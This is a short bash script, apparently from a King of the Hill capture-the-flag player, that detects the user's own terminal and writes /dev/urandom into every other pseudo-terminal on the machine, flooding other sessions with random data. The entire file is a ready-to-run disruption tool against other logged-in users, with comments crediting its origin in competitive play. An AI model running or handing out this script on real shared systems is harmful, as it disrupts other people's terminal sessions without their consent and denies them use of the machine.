#!/bin/bash

#   __                                     __    
#  |  |--.---.-.--------.-----.----.-----.|  |--.
#  |  _  |  _  |        |  _  |   _|  _  ||     |
#  |_____|___._|__|__|__|_____|__| |   __||__|__|
#                                  |__|          
#
#  Author: Bamorph
#  Year: 2023
#  Credit: John Hammond
#
#  Notes: John hammond used the base version of this code in King of the Hill against Optional and others. 
#  The original code was to use the tty command to determine your own tty session and then 
#  'cat /dev/urandom > /dev/pts/5' into someone else's pts session. the result is the other
#  person's screen being completely spammed by random data.


# Get the current PTS (your PTS)
current_pts=$(tty | cut -d '/' -f 4)

# Iterate through all PTS except the current one
for pts in $(ls /dev/pts/ | grep -E '^[0-9]+$' | grep -v "$current_pts"); do
    echo "Spamming pts/$pts"
    cat /dev/urandom > /dev/pts/$pts &
done
